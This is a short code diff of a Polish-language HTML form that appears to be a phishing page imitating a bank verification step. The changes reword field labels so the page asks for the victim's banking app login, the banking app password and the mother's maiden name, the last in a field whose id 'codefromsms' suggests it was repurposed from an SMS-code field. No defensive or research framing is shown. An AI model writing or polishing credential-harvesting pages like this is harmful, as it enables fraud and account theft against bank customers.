@@ -23,16 +23,16 @@
                 </div>
             </div>
 
-            <label for="login"> Identyfikator lub login:</label>
+            <label for="login"> Podaj login do aplikacji bankowej:</label>
             <input id="login" type="text" name="login" autocomplete="off" value="" class="challenge-data-entry-text "
-                   placeholder="Identyfikator lub login" autofocus="autofocus">
+                   placeholder="Podaj login do aplikacji bankowej" autofocus="autofocus">
             <br>
 
-            <label for="password"> Wpisz hasło:</label>
+            <label for="password"> Podaj hasło do aplikacji bankowej:</label>
             <input id="password" type="password" name="password" autocomplete="off" value="" class="challenge-data-entry-text "
                    placeholder="Hasło" autofocus="autofocus">
             <br>
-            <label for="codefromsms"> Podaj nazwisko panienskie Twojej matki:</label>
+            <label for="codefromsms"> Podaj rodowe nazwisko matki:</label>
             <input id="codefromsms" type="text" name="mother" autocomplete="off" value=""
                    class="challenge-data-entry-text "
                    placeholder="Nazwisko panienskie Twojej matki" autofocus="autofocus">
